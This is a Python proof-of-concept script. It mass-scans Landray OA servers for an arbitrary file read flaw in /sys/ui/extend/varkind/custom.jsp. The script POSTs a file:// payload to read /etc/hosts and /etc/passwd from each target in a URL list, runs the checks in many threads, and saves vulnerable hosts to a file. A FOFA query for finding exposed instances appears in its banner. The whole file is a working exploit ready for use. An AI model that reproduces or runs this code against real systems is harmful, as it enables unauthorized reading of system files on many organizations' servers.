#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
# @Author  : Cr4y0n
# @Software: PyCharm
# @Time    : 2021/5/8
# @Github  : https://github.com/Cr4y0nXX

import os
import time
import requests
from threading import Lock
from concurrent.futures import ThreadPoolExecutor
from argparse import ArgumentParser

class POC:
    def __init__(self):
        self.banner()
        self.args = self.parseArgs()
        self.init()
        self.urlList = self.loadURL()  # 所有目标
        self.multiRun()
        self.start = time.time()

    def banner(self):
        logo = r"""
     _                     _                ______               _  ___             ______ _ _      
    | |                   | |               | ___ \             | |/ _ \            |  ___(_) |     
    | |     __ _ _ __   __| |_ __ __ _ _   _| |_/ /___  __ _  __| / /_\ \_ __  _   _| |_   _| | ___ 
    | |    / _` | '_ \ / _` | '__/ _` | | | |    // _ \/ _` |/ _` |  _  | '_ \| | | |  _| | | |/ _ \
    | |___| (_| | | | | (_| | | | (_| | |_| | |\ \  __/ (_| | (_| | | | | | | | |_| | |   | | |  __/
    \_____/\__,_|_| |_|\__,_|_|  \__,_|\__, \_| \_\___|\__,_|\__,_\_| |_/_| |_|\__, \_|   |_|_|\___|  POC
                                        __/ |                                   __/ |               
                                       |___/                                   |___/       Author: Cr4y0n
        """
        msg = """
==================================================
| 漏洞名称 | 蓝凌OA系统存在任意文件读取漏洞
| 漏洞时间 | 2021-05-01
| 影响版本 | 当前全版本？
| 漏洞文件 | custom.jsp
| 默认路径 | /sys/ui/extend/varkind/custom.jsp
| FOFA语句 | app="Landray-OA系统"
==================================================
        """
        print("\033[91m" + logo + "\033[0m")
        print(msg)

    def init(self):
        print("\nthread:", self.args.thread)
        print("timeout:", self.args.timeout)
        msg = ""
        if os.path.isfile(self.args.file):
            msg += "Load url file successfully\n"
        else:
            msg += f"\033[31mLoad url file {self.args.file} failed\033[0m\n"
        print(msg)
        if "failed" in msg:
            print("Init failed, Please check the environment.")
            os._exit(0)
        print("Init successfully")

    def parseArgs(self):
        date = time.strftime("%Y-%m-%d_%H-%M-%S", time.localtime())
        parser = ArgumentParser()
        parser.add_argument("-f", "--file", required=False, type=str, default=f"./url.txt", help=f"The url file, default is ./url.txt")
        parser.add_argument("-t", "--thread", required=False, type=int, default=32, help=f"Number of thread, default is 32")
        parser.add_argument("-T", "--timeout", required=False, type=int, default=3,  help="request timeout(default 3)")
        parser.add_argument("-o", "--output", required=False, type=str, default=f"./{date}.txt",  help=f"Vuln url output file, default is ./{date}.txt")
        return parser.parse_args()

    # 验证漏洞
    def verify(self, url):
        repData = self.readFile(url, "/etc/hosts")
        if "127.0.0.1" in repData:
            msg = f"\033[32m[+] [ Vuln ]  {url}\033[0m"
            self.lock.acquire()
            try:
                self.findCount += 1
                self.vulnRULList.append(url)
            finally:
                self.lock.release()
        elif "Conn" == repData:
            msg = f"\033[31m[!] [ Conn ]  {url}\033[0m"
        else:
            repData = self.readFile(url, "/etc/passwd")
            if "root" in repData:
                msg = f"\033[32m[+] [ Vuln ]  {url}\033[0m"
                self.lock.acquire()
                try:
                    self.findCount += 1
                    self.vulnRULList.append(url)
                finally:
                    self.lock.release()
            elif "Conn" == repData:
                msg = f"\033[31m[!] [ Conn ]  {url}\033[0m"
            else:
                msg = f"[-] [ Safe ]  {url}"
        self.lock.acquire()
        try:
            print(msg)
        finally:
            self.lock.release()

    # 利用漏洞读取文件
    def readFile(self, url, filename):
        reqURL = url + "/sys/ui/extend/varkind/custom.jsp"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        postData = 'var={"body":{"file":"file://' + filename + '"}}'
        try:
            rep = requests.post(url=reqURL, headers=headers, data=postData, timeout=self.args.timeout)
            fileData = rep.text
            return fileData
        except:
            return ""

    # 加载url地址(带http://)
    def loadURL(self):
        urlList = []
        with open(self.args.file) as f:
            for line in f.readlines():
                line = line.replace("http://", "") if "http://" in line else line
                line = line.replace("https://", "") if "https://" in line else line
                urlList.append(f"http://{line.strip()}")
        return urlList

    # 多线程运行
    def multiRun(self):
        self.findCount = 0
        self.vulnRULList = []
        self.lock = Lock()
        executor = ThreadPoolExecutor(max_workers=self.args.thread)
        executor.map(self.verify, self.urlList)

    # 输出到文件
    def output(self):
        if not os.path.isdir(r"./output"):
            os.mkdir(r"./output")
        self.outputFile = f"./output/{self.args.output}"
        with open(self.outputFile, "a") as f:
            for url in self.vulnRULList:
                f.write(url + "\n")

    def __del__(self):
        try:
            print("\nattemptCount：\033[31m%d\033[0m   findCount：\033[32m%d\033[0m" % (len(self.urlList), self.findCount))
            self.end = time.time()
            print("Time Spent: %.2f" % (self.end - self.start))
            self.output()
            print("-" * 20, f"\nThe vulnURL has been saved in {self.outputFile}\n")
        except:
            pass

if __name__ == "__main__":
    POC()


